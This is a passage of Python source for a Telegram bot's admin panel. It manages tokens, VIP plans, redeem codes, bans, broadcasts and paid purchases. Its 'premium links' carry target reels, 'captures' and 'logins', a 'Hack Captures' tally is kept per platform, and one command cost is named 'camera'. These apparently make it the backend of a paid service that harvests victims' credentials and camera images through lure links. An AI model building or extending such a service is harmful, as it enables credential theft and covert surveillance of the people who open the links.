    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_admin_panel"))
    bot.send_message(message.chat.id, "<blockquote>🎛 Toggle Features</blockquote>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data == "back_to_admin_panel")
def back_to_admin_panel_cb(call):
    if not _is_admin(call.from_user.id): return
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, "⚙️ Admin Panel", reply_markup=get_admin_menu())

@bot.callback_query_handler(func=lambda c: c.data.startswith("toggle_feat:"))
def toggle_feat_cb(call):
    if not _is_admin(call.from_user.id): return
    feat = call.data.split(":", 1)[1]
    db = load_db()
    pub = db["settings"]["feature_public"]
    pub[feat] = not pub.get(feat, True)
    save_db(db)
    mk = types.InlineKeyboardMarkup(row_width=1)
    for k, v in pub.items():
        state = "🟢 PUBLIC" if v else "🔴 PRIVATE"
        mk.add(types.InlineKeyboardButton(f"{k.upper()}: {state}", callback_data=f"toggle_feat:{k}"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_admin_panel"))
    try: bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=mk)
    except Exception: pass
    bot.answer_callback_query(call.id, f"{feat} toggled!")

@bot.message_handler(func=lambda m: m.text == BTN_PREMIUM_LINKS)
def admin_premium_links(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    links = db.get("premium_links", {})
    if not links:
        bot.send_message(message.chat.id, f"<blockquote>❌ No links.\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu()); return
    mk = types.InlineKeyboardMarkup(row_width=1)
    for lid, l in list(links.items())[-20:]:
        plat = l.get("platform", "?")
        owner = l.get("uid", "?")
        hits = len(l.get("captures", [])) + len(l.get("logins", []))
        mk.add(types.InlineKeyboardButton(f"🎯 {plat} | UID:{owner} | Hits:{hits}", callback_data=f"prem_view:{lid}"))
    bot.send_message(message.chat.id, f"<blockquote>🎯 <b>Premium Links ({len(links)})</b></blockquote>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("prem_view:"))
def prem_view_cb(call):
    if not _is_admin(call.from_user.id): return
    lid = call.data.split(":", 1)[1]
    db = load_db()
    l = db.get("premium_links", {}).get(lid)
    if not l:
        bot.answer_callback_query(call.id, "Not found", show_alert=True); return
    mk = types.InlineKeyboardMarkup(row_width=1)
    mk.add(types.InlineKeyboardButton("🗑 Delete", callback_data=f"prem_del:{lid}"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_admin_panel"))
    text = (f"🎯 <b>Premium Link</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"ID: <code>{lid}</code>\nPlatform: {l.get('platform')}\n"
            f"Owner: <code>{l.get('uid')}</code>\n"
            f"Reel: <code>{html.escape(str(l.get('target_reel',''))[:80])}</code>\n"
            f"📸 Captures: {len(l.get('captures',[]))}\n🔐 Logins: {len(l.get('logins',[]))}")
    try: bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=mk)
    except Exception: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("prem_del:"))
def prem_del_cb(call):
    if not _is_admin(call.from_user.id): return
    lid = call.data.split(":", 1)[1]
    db = load_db()
    if lid in db.get("premium_links", {}):
        del db["premium_links"][lid]; save_db(db)
    bot.answer_callback_query(call.id, "Deleted")
    bot.send_message(call.message.chat.id, "✅ Deleted", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_HACK_CAPTURES)
def admin_hack_captures(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    caps = db.get("hack_captures", {})
    total = sum(len(v) for v in caps.values())
    text = f"<blockquote>🗂 <b>Hack Captures</b>\nTotal: <b>{total}</b>\n"
    for platform, lst in caps.items():
        text += f"• {platform}: {len(lst)}\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == "➕ Add Custom Button")
def admin_add_custom_btn(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Button text:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, process_add_custom_btn)

def process_add_custom_btn(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    btn = message.text.strip()
    db = load_db()
    c = db["settings"].setdefault("custom_buttons", [])
    if btn not in c:
        c.append(btn); save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {btn} added!</blockquote>", reply_markup=get_admin_menu())
    else:
        bot.send_message(message.chat.id, f"<blockquote>⚠️ Exists.</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == "🗑 Remove Custom Button")
def admin_remove_custom_btn(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    c = db["settings"].get("custom_buttons", [])
    if not c:
        bot.send_message(message.chat.id, "<blockquote>No buttons.</blockquote>", reply_markup=get_admin_menu()); return
    mk = types.InlineKeyboardMarkup(row_width=1)
    for b in c: mk.add(types.InlineKeyboardButton(b, callback_data=f"del_cbtn:{b}"))
    bot.send_message(message.chat.id, "<blockquote>Delete:</blockquote>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("del_cbtn:"))
def del_cbtn_callback(call):
    if not _is_admin(call.from_user.id): return
    b = call.data.split(":", 1)[1]
    db = load_db()
    c = db["settings"].get("custom_buttons", [])
    if b in c: c.remove(b); save_db(db)
    bot.answer_callback_query(call.id, "Removed")
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: pass
    bot.send_message(call.message.chat.id, f"✅ Removed: {b}", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_SET_DISCOUNT)
def admin_set_discount(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    cur = db["settings"].get("discount_rate", 0)
    msg = bot.send_message(message.chat.id, f"<blockquote>Discount % (current: {cur}):\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_set_discount_apply)

def admin_set_discount_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        v = int(message.text.strip())
        if v < 0 or v > 100: raise ValueError
        db = load_db(); db["settings"]["discount_rate"] = v; save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {v}%</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ 0-100!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_SET_TOKENS_CMD)
def admin_set_tokens_cmd(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    costs = db["settings"].get("command_tokens", {})
    text = "🪙 <b>Costs</b>\n"
    for k, v in costs.items(): text += f"• {k}: <b>{v}</b>\n"
    text += "\nFormat: <code>cmd_key new_cost</code>"
    msg = bot.send_message(message.chat.id, f"<blockquote>{text}\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_set_tokens_cmd_apply)

def admin_set_tokens_cmd_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        parts = message.text.strip().split()
        k, c = parts[0], int(parts[1])
        if c < 0: raise ValueError
        db = load_db(); db["settings"]["command_tokens"][k] = c; save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {k}={c}</blockquote>", reply_markup=get_admin_menu())
    except Exception:
        bot.send_message(message.chat.id, f"<blockquote>❌ Format: <code>camera 3</code></blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_BOT_AD)
def admin_bot_ad_menu(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    ad = db["settings"].get("ad_bot")
    status = "Active ✅" if (ad and ad.get("active")) else "Inactive ❌"
    bot.send_message(message.chat.id,
        f"<blockquote>📢 <b>Bot Ad</b>\nStatus: <b>{status}</b>\n"
        f"Current: {ad.get('name') if ad else 'None'}\n\n"
        f"• <code>/setad Name | url</code>\n• <code>/removead</code></blockquote>")

@bot.message_handler(commands=['setad'])
def cmd_setad(message):
    if not _is_admin(message.from_user.id): return
    try:
        raw = message.text.split(None, 1)[1]
        n, l = [x.strip() for x in raw.split("|")]
        db = load_db(); db["settings"]["ad_bot"] = {"name": n, "link": l, "active": True}; save_db(db)
        bot.reply_to(message, f"<blockquote>✅ {n} → {l}</blockquote>")
    except Exception:
        bot.reply_to(message, "<blockquote>❌ <code>/setad Name | url</code></blockquote>")

@bot.message_handler(commands=['removead'])
def cmd_removead(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    if "ad_bot" in db["settings"]:
        db["settings"]["ad_bot"]["active"] = False; save_db(db)
    bot.reply_to(message, "<blockquote>✅ Ad disabled</blockquote>")

@bot.message_handler(func=lambda m: m.text == BTN_USER_ACTIVITY)
def admin_user_activity(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    users = db.get("users", {})
    text = f"<blockquote>👥 <b>Total Users: {len(users)}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in list(users.items())[-15:]:
        text += f"• <b>{data.get('name','N/A')}</b> | <code>{uid}</code> | {data.get('username','N/A')}\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda m: m.text == BTN_USER_PLAN)
def admin_user_plan(message):
    if not _is_admin(message.from_user.id): return
    db = load_db(); users = db.get("users", {})
    text = "<blockquote>📋 <b>Plans</b>\n"
    now = datetime.now()
    for uid, d in list(users.items())[-20:]:
        plan = d.get("plan", "free"); exp = d.get("expiry"); tk = d.get("tokens", 0)
        if int(uid) == ADMIN_ID: s = "👑 Admin"
        elif plan == "unlimited" and exp:
            try:
                e = datetime.strptime(exp, "%Y-%m-%d %H:%M:%S")
                s = f"👑 VIP ({max(1,(e-now).days+1)}d)" if now < e else f"⚠️ | {tk}"
            except: s = f"⚠️ | {tk}"
        elif tk > 0: s = f"🪙 {tk}"
        else: s = "❌"
        text += f"• {d.get('name','N/A')} | <code>{uid}</code> | {s}\n"
    text += f"{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda m: m.text == BTN_ACTIVATE_PLAN)
def admin_activate_info(message):
    if not _is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, f"<blockquote>⚡ <b>Commands</b>\n<code>/setvip UID DAYS</code>\n<code>/addtokens UID TOKENS</code>\n<code>/broadcast_vip DAYS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(func=lambda m: m.text == BTN_GEN_REDEEM)
def admin_gen_redeem(message):
    if not _is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, f"<blockquote>Type:</blockquote>", reply_markup=get_redeem_type_menu())

@bot.message_handler(func=lambda m: m.text == "Normal" and int(m.from_user.id) == ADMIN_ID)
def admin_normal_users(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>Users?\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_normal_tokens)

def admin_normal_tokens(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        uc = int(message.text.strip())
        msg = bot.send_message(message.chat.id, f"<blockquote>Tokens per user?</blockquote>")
        bot.register_next_step_handler(msg, admin_normal_create, uc)
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Number!</blockquote>", reply_markup=get_admin_menu())

def admin_normal_create(message, uc):
    try:
        tc = int(message.text.strip())
        code = "AYUSH-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        db = load_db()
        db["redeem_codes"][code] = {"type": "token", "value": tc, "uses_left": uc, "used_by": [], "note": "Normal"}
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>🎟 <code>{code}</code>\n{uc} users | {tc} tokens</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == "VIP" and int(m.from_user.id) == ADMIN_ID)
def admin_vip_users(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>Users?</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_vip_days)

def admin_vip_days(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        uc = int(message.text.strip())
        msg = bot.send_message(message.chat.id, f"<blockquote>Days?</blockquote>")
        bot.register_next_step_handler(msg, admin_vip_create, uc)
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Number!</blockquote>", reply_markup=get_admin_menu())

def admin_vip_create(message, uc):
    try:
        dc = int(message.text.strip())
        code = "AYUSH-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        db = load_db()
        db["redeem_codes"][code] = {"type": "unlimited", "days": dc, "uses_left": uc, "used_by": [], "note": "VIP"}
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>👑 <code>{code}</code>\n{uc} users | {dc} days</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_ADD_ALL)
def admin_add_all(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Tokens to add:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_add_all_apply)

def admin_add_all_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        t = int(message.text.strip())
        if t <= 0: raise ValueError
        db = load_db(); c = 0
        for uid in db["users"]:
            db["users"][uid]["tokens"] = db["users"][uid].get("tokens", 0) + t
            _add_history(db["users"][uid], "admin_add_all", t); c += 1
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ +{t} to {c} users!</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_DEDUCT_ALL)
def admin_deduct_all(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Tokens to deduct:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_deduct_all_apply)

def admin_deduct_all_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        t = int(message.text.strip())
        if t <= 0: raise ValueError
        db = load_db(); c = 0
        for uid in db["users"]:
            cur = db["users"][uid].get("tokens", 0)
            db["users"][uid]["tokens"] = max(0, cur - t)
            _add_history(db["users"][uid], "admin_deduct_all", -t); c += 1
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ -{t} from {c} users!</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_ADD_ONE)
def admin_add_one(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Format: <code>UID TOKENS</code>\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_add_one_apply)

def admin_add_one_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        parts = message.text.split(); uid, t = parts[0], int(parts[1])
        if t <= 0: raise ValueError
        db = load_db()
        if uid not in db["users"]: raise KeyError
        db["users"][uid]["tokens"] = db["users"][uid].get("tokens", 0) + t
        _add_history(db["users"][uid], "admin_add", t); save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {uid} +{t}\n💰 {db['users'][uid]['tokens']}</blockquote>", reply_markup=get_admin_menu())
    except KeyError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu())
    except Exception:
        bot.send_message(message.chat.id, f"<blockquote>❌ Format: <code>UID TOKENS</code></blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_DEDUCT_ONE)
def admin_deduct_one(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Format: <code>UID TOKENS</code>\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_deduct_one_apply)

def admin_deduct_one_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        parts = message.text.split(); uid, t = parts[0], int(parts[1])
        if t <= 0: raise ValueError
        db = load_db()
        if uid not in db["users"]: raise KeyError
        cur = db["users"][uid].get("tokens", 0)
        db["users"][uid]["tokens"] = max(0, cur - t)
        _add_history(db["users"][uid], "admin_deduct", -t); save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {uid} -{t}\n💰 {db['users'][uid]['tokens']}</blockquote>", reply_markup=get_admin_menu())
    except KeyError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu())
    except Exception:
        bot.send_message(message.chat.id, f"<blockquote>❌ Format: <code>UID TOKENS</code></blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_CHECK_USER)
def admin_check_user(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_check_apply)

def admin_check_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db(); u = db["users"].get(uid)
    if not u:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu()); return
    text = (f"<blockquote>👤 <b>User</b>\n{u.get('name','N/A')}\n{u.get('username','N/A')}\n"
            f"<code>{uid}</code>\n🪙 {u.get('tokens',0)}\n📦 {u.get('plan','free')}\n"
            f"⏳ {u.get('expiry') or 'N/A'}\n🚫 {u.get('banned')}\n"
            f"👥 Refs: {len(u.get('referrals',[]))}\n{DEV_TAG}</blockquote>")
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_RESET_USER)
def admin_reset_user(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_reset_apply)

def admin_reset_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    if uid not in db["users"]:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu()); return
    db["users"][uid].update({"tokens": 0, "plan": "free", "expiry": None, "banned": False})
    save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>♻️ Reset: {uid}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_CODES_LIST)
def admin_codes_list(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    codes = db.get("redeem_codes", {})
    if not codes:
        bot.send_message(message.chat.id, f"<blockquote>No codes.</blockquote>", reply_markup=get_admin_menu()); return
    text = f"<blockquote>🎟 <b>Codes ({len(codes)})</b>\n"
    for code, d in list(codes.items())[:30]:
        v = f"{d.get('value')} tokens" if d.get("type") == "token" else f"VIP {d.get('days')}d"
        text += f"<code>{code}</code> | {v} | {d.get('uses_left')}\n"
    text += f"{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_REVOKE_CODE)
def admin_revoke_code(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Code:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_revoke_apply)

def admin_revoke_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    code = message.text.strip().upper()
    db = load_db()
    if code in db.get("redeem_codes", {}):
        del db["redeem_codes"][code]; save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>🗑 Revoked: {code}</blockquote>", reply_markup=get_admin_menu())
    else:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_STATS)
def admin_stats(message):
    if not _is_admin(message.from_user.id): return
    db = load_db(); users = db.get("users", {})
    total = len(users)
    vip = sum(1 for u in users.values() if u.get("plan") == "unlimited")
    tok = sum(1 for u in users.values() if u.get("tokens", 0) > 0)
    banned = sum(1 for u in users.values() if u.get("banned"))
    codes = len(db.get("redeem_codes", {}))
    prem = len(db.get("premium_links", {}))
    tt = sum(u.get("tokens", 0) for u in users.values())
    text = (f"<blockquote>📊 <b>Stats</b>\n👥 Users: {total}\n👑 VIP: {vip}\n"
            f"🪙 Token Holders: {tok}\n💎 Tokens: {tt}\n🚫 Banned: {banned}\n"
            f"🎟 Codes: {codes}\n🎯 Premium Links: {prem}\n{DEV_TAG}</blockquote>")
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_BROADCAST)
def admin_broadcast(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Broadcast:</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_broadcast_apply)

def admin_broadcast_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    db = load_db(); ok = fail = 0
    for uid in db["users"]:
        try:
            bot.send_message(int(uid), message.text); ok += 1
        except Exception: fail += 1
        time.sleep(0.05)
    bot.send_message(message.chat.id, f"<blockquote>📢 Done!\n✅ {ok} | ❌ {fail}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_BAN)
def admin_ban(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_ban_apply)

def admin_ban_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    if uid not in db["users"]:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu()); return
    db["users"][uid]["banned"] = True; save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>🚫 {uid} banned!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_UNBAN)
def admin_unban(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_unban_apply)

def admin_unban_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    if uid not in db["users"]:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu()); return
    db["users"][uid]["banned"] = False; save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>✅ {uid} unbanned!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_SET_REF)
def admin_set_ref(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    cur = db["settings"].get("referral_credits", 2)
    msg = bot.send_message(message.chat.id, f"<blockquote>Ref credits (current: {cur}):</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_set_ref_apply)

def admin_set_ref_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        v = int(message.text.strip())
        if v < 0 or v > 100: raise ValueError
        db = load_db(); db["settings"]["referral_credits"] = v; save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {v} per invite</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ 0-100!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_MAINTENANCE)
def admin_maintenance(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    cur = db["settings"].get("maintenance", False)
    db["settings"]["maintenance"] = not cur; save_db(db)
    status = "🔴 ON" if not cur else "🟢 OFF"
    bot.send_message(message.chat.id, f"<blockquote>🔧 Maintenance: {status}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_EXPORT_DB)
def admin_export_db(message):
    if not _is_admin(message.from_user.id): return
    try:
        with open("database.json", "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"📤 DB Export")
    except Exception as e:
        bot.send_message(message.chat.id, f"<blockquote>❌ {e}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(commands=['setvip'])
def cmd_setvip(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, u, d = message.text.split(); d = int(d)
        db = load_db()
        if u not in db["users"]: bot.reply_to(message, "❌ Not found"); return
        db["users"][u]["plan"] = "unlimited"
        db["users"][u]["expiry"] = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
        _add_history(db["users"][u], f"setvip_{d}d", 0); save_db(db)
        bot.reply_to(message, f"✅ {u} → {d}d VIP")
    except Exception:
        bot.reply_to(message, "❌ <code>/setvip UID DAYS</code>")

@bot.message_handler(commands=['addtokens'])
def cmd_addtokens(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, u, t = message.text.split(); t = int(t)
        db = load_db()
        if u not in db["users"]: bot.reply_to(message, "❌ Not found"); return
        db["users"][u]["tokens"] = db["users"][u].get("tokens", 0) + t
        _add_history(db["users"][u], "addtokens", t); save_db(db)
        bot.reply_to(message, f"✅ {u} +{t}")
    except Exception:
        bot.reply_to(message, "❌ <code>/addtokens UID TOKENS</code>")

@bot.message_handler(commands=['broadcast_vip'])
def cmd_broadcast_vip(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, d = message.text.split(); d = int(d)
        db = load_db()
        exp = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
        c = 0
        for uid in db["users"]:
            db["users"][uid]["plan"] = "unlimited"
            db["users"][uid]["expiry"] = exp
            _add_history(db["users"][uid], f"broadcast_vip_{d}d", 0); c += 1
        save_db(db)
        bot.reply_to(message, f"🎉 {d}d VIP → {c} users")
    except Exception:
        bot.reply_to(message, "❌ <code>/broadcast_vip DAYS</code>")

def money(value):
    return Decimal(str(value)).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)

def buy_keyboard():
    db = load_db()
    disc = db["settings"].get("discount_rate", 0)
    mk = types.InlineKeyboardMarkup(row_width=1)
    for pid, plan in db.get("plans", DEFAULT_PLANS).items():
        if plan.get("active", True):
            orig = money(plan.get("price", 0))
            if disc > 0:
                final = money(orig * (Decimal("1") - Decimal(str(disc)) / Decimal("100")))
                label = f"🛍 {plan.get('name', pid)} | ₹{final} ({disc}% OFF)"
            else:
                label = f"🛍 {plan.get('name', pid)} | ₹{orig}"
            mk.add(types.InlineKeyboardButton(label, callback_data=f"buy_plan:{pid}"))
    return mk

@bot.message_handler(func=lambda m: m.text == BTN_BUY)
def direct_buy_menu(message):
    bot.send_message(message.chat.id, f"<blockquote>💳 <b>DIRECT BUY</b></blockquote>", reply_markup=buy_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "buy_open")
def buy_open_callback(call):
    if call.message.chat.type != "private": return
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, f"<blockquote>💳 Plans:</blockquote>", reply_markup=buy_keyboard())

